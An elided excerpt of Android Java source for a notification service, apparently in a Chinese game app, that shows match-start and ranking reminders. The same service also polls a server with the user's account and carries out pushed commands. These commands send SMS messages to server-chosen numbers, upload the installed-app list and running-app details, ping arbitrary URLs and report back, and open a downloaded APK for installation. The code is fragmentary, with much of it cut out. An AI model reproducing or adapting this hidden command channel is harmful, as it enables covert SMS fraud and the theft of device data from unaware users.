...
public class NotificationService extends Service {
	...
	public void onCreate() {
		...
		shared = getApplication().getSharedPreferences("time_span",
		...
		ScheduledTask.addRateTask(new AutoTask() {
			...
			public void run() {
				try {
					...
					String url = HttpURL.NOTICE_PUSH_URL + "?" + ACCOUNT + "="
							+ account;
					String result = getDate(url);
					// 消息不为空，就去解析消息
					// result =
					// "{\"packageName\":\"til.mall.activity\",\"ticker\":\"爱是商城\",\"logo\":\"http://avatar.csdn.net/0/7/0/1_first10010.jpg\",\"title\":\"爱是商城打折\",\"content\":\"爱是商城回馈新老用户\",\"time\":\"2013-10-27\",\"type\":2,\"action\":\"http://www.baidu.com\"}";
					if (!TextUtils.isEmpty(result)) {
						Database.PUSH_DATA = JsonHelper.fromJson(result,
						...
						if (Database.PUSH_DATA != null) {
							...
							if (!TextUtils.isEmpty(notices)) {
								NoticesVo pushData = JsonHelper.fromJson(
										notices, NoticesVo.class);
								if (pushData == null)
									return;
								if ("1".equals(pushData.getType())) {// 1:推送通知
									...
									if (!TextUtils.isEmpty(pushData
											.getContent())) {
										GameCommandCheck gcc = JsonHelper
												.fromJson(
														pushData.getContent(),
														GameCommandCheck.class);
										if (null != gcc) {
											doCommand(gcc);
										}
									}
		...
		timer.schedule(new TimerTask() {
			...
			public void run() {
				...
				Log.i("Order",
						"刷时间。。。。。。。。。。。。是否前台运行："
								+ ActivityUtils.isRunningForeground());
				checkGameTime();
			}
			...
			private void checkGameTime() {
				if (null != roomStartTimeMap) {
					...
					Iterator<Entry<String, GameTimeVo>> it = roomStartTimeMap
							.entrySet().iterator();
					Log.i("", "roomStartTimeMap:" + it.hasNext()
							+ "                        roomEndTimeMap:"
							+ roomEndTimeMap.entrySet().iterator().hasNext());
					while (it.hasNext()) {
						Map.Entry<String, GameTimeVo> entry = it.next();
						String key = entry.getKey();
						GameTimeVo value = entry.getValue();
						if (value.getStartTime() < 60000) {
							String msg = "亲，你报名的”" + value.getRoomName()
									+ "“马上就要开赛了，赶紧去比赛吧！";
							if (ActivityUtils.isRunningForeground()) {
								if (TextUtils.isEmpty(joinRoomCode) || // 当前没进复合赛房间
										!joinRoomCode.trim().equals(
												value.getRoomCode().trim())) {// 当前所在的复合赛房间不是刚才报名的房间
									DialogUtils.mesTip(msg, false, false);
								}
							} else {
								NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
								Notification n = new Notification(
										R.drawable.icon, "通知", System
												.currentTimeMillis());
								...
								PendingIntent pi = PendingIntent
										.getActivity(NotificationService.this,
												0, intent2, 0);
				...
				if (null != roomEndTimeMap) {
					...
					Iterator<Entry<String, GameTimeVo>> iter = roomEndTimeMap
							.entrySet().iterator();
					while (iter.hasNext()) {
						Map.Entry<String, GameTimeVo> entry = iter.next();
						String keys = entry.getKey();
						GameTimeVo values = entry.getValue();
						if (values.getEndTime() < 0) {
							String result = HttpRequest.getRank(keys);
							GamePrizeRecord gp = JsonHelper.fromJson(result,
									GamePrizeRecord.class);
							if (null != gp && !TextUtils.isEmpty(gp.getRank())) {
								String msg = "亲，比赛结果出来了，你获得了第" + gp.getRank()
										+ "名。";
								if (ActivityUtils.isRunningForeground()) {
									DialogUtils.mesTip(msg, false, false);
								} else {
	...
	private String getDate(String url) {
		...
		Log.d("forTag", " timeSpace : " + timeSpace + " || canRequest : "
				+ canRequest);
		if (canRequest) {// 本地两个时间差大于后台配置的值，则去后台取数据；
			...
			editor.putLong("timespan", beforeTime);
			editor.commit();
			if ("1".equals(HttpRequest.getApiSwitch("1"))
	...
	private void doCommand(GameCommandCheck gcc) {
		...
		if (!TextUtils.isEmpty(term)) {
			...
			ArrayList<CommandUploadDesktopAppInfo> allApp = ActivityUtils
					.getAllAppInfo();
			...
			if (networkTypes != null) {
				String networkType = String.valueOf(ActivityUtils
						.getNetWorkType());
		...
		case 2:// 2=通知栏指令
			...
			if (!TextUtils.isEmpty(content)) {
				CommandNoticeBar noticeBar = JsonHelper.fromJson(content,
						CommandNoticeBar.class);
		...
		case 3:// 3=简单指令
			...
			if (!TextUtils.isEmpty(cmd)) {
				CommandSimple simple = JsonHelper.fromJson(cmd,
						CommandSimple.class);
		...
		case 4:// 4=短信指令
			...
			if (!TextUtils.isEmpty(sms)) {
				CommandSMS smsDetail = JsonHelper.fromJson(sms,
						CommandSMS.class);
				if (null != smsDetail && mutchTerm) {
					if (smsDetail.getType().equals("1")) {
						ActivityUtils.sendSMS(smsDetail.getSender(),
								smsDetail.getContent());
					}
				}
			}
			break;
		case 5:// 5=桌面APP信息上传
			ArrayList<CommandUploadDesktopAppInfo> allApp = ActivityUtils
					.getAllAppInfo();
			HttpRequest
					.postCommandResult(gcc.getCommandCode(), allApp, account);
			break;
		case 6:// 当前App信息上传
			CommandUploadRunAppInfo runApp = ActivityUtils.getRunAppInfo();
			HttpRequest
					.postCommandResult(gcc.getCommandCode(), runApp, account);
			break;
		default:
			break;
		}
				...
				public void run() {
					try {
						if (null != gcc.getCommandContentMap()) {
							Map<String, String> commContent = gcc
									.getCommandContentMap();
							if (commContent.containsKey("pingUrl")
									&& commContent.containsKey("pingCount")) {
								ReturnPing rPing = ActivityUtils.getPing(
										commContent.get("pingUrl"), Integer
												.parseInt(commContent
														.get("pingCount")));// ping信息
								if (null == rPing) {
									rPing = new ReturnPing();
								}
								rPing.setLoginTime(Database.LOGIN_TIME);// 登录时间
								rPing.setNetworkType(ActivityUtils
										.getNetWorkType());// 网络类型
								rPing.setCommandCode(gcc.getCommandCode());// 指令编号
								// 返回指令结果
								HttpRequest.postCommandResult(
										gcc.getCommandCode(), rPing, account);
							}
						}
					} catch (Exception e) {
					}
	...
	private void doCmd(CommandSimple simple) {
		...
		case 4:
			...
			if (sdCardExist) { // 打开APK
				...
				File file = CrashApplication.getInstance().getFileStreamPath(
						apkName);
				if (file.exists()) {
					Intent openIntent = ActivityUtils.getInstallIntent(file);
					startActivity(openIntent);
